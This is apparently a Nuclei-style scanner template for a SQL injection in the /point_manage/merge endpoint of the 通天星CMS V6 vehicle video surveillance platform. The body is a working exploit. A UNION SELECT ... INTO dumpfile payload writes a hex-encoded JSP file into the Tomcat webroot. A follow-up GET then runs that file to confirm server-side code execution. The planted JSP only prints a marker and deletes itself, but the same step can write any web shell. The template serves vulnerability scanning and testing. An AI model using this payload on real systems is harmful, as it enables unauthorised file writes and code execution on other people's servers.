id: poc-yaml-g-sky-cmsv6-point-managemerge-sqli
info:
  name: 通天星CMS V6车载视频监控平台 point_managemerge SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_text_alphanumeric(4)}}"

http:
  - id: sql-injection-payload
    method: POST
    path:
      - '{{BaseURL}}/point_manage/merge'
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      id=1&name=1' UNION SELECT%0aNULL, 0x3c25206f75742e7072696e7428227a7a3031306622293b206e6577206a6176612e696f2e46696c65286170706c69636174696f6e2e6765745265616c5061746828726571756573742e676574536572766c657450617468282929292e64656c65746528293b20253e,NULL,NULL,NULL,NULL,NULL,NULL
      INTO dumpfile '../../tomcat/webapps/gpsweb/{{t1}}.jsp' FROM user_session a
      WHERE '1 '='1 &type=3&map_id=4&install_place=5&check_item=6&create_time=7&update_time=8
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"result":0,"message":"OK"'
      - type: word
        part: header
        words:
          - "application/json"

  - id: verify-sqli-execution
    method: GET
    path:
      - '{{BaseURL}}/{{t1}}.jsp'
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "zz010f"
      - type: word
        part: body
        negative: true
        words:
          - "<"
